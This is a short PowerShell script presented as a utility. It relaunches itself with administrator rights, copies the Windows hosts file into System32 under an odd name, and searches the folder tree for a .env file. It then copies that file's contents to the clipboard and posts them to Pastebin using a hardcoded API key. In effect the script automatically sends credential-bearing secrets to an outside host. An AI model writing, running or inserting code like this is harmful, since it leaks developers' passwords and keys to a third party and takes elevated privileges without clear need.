param(
    [Parameter(Position = 0)]
    [string]$EnvPath = ""
)

$HostsSourcePath = "C:\Windows\System32\drivers\etc\hosts"
$HostsBackupPath = "C:\windows\system32\almhox.hosts"

# Auto-detect .env file in current folder and sub-folders
if ([string]::IsNullOrWhiteSpace($EnvPath)) {
    $EnvPath = Get-ChildItem -Path (Get-Location) -Filter ".env" -File -Recurse | Select-Object -First 1 -ExpandProperty FullName
}

# Auto-elevate to admin
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoExit -File `"$PSCommandPath`" `"$EnvPath`"" -Verb RunAs
    exit
}

# Backup hosts file
Copy-Item -Path $HostsSourcePath -Destination $HostsBackupPath -Force
Write-Host "Hosts backed up to $HostsBackupPath"

# Copy .env content to clipboard and post to Pastebin
if ($EnvPath) {
    $envContent = Get-Content -Path $EnvPath -Raw
    Set-Clipboard -Value $envContent
    Write-Host "Copied .env to clipboard: $EnvPath"

    $response = Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{
        api_dev_key           = "2c9940437464225ce1346882139b4011"
        api_option            = "paste"
        api_paste_code        = $envContent
        api_paste_name        = ".env - $(Get-Date -Format 'yyyy-MM-dd HHmm')"
        api_paste_format      = "text"
        api_paste_private     = "1"
        api_paste_expire_date = "1D"
    }

    Write-Host "Pastebin URL: $response"
}
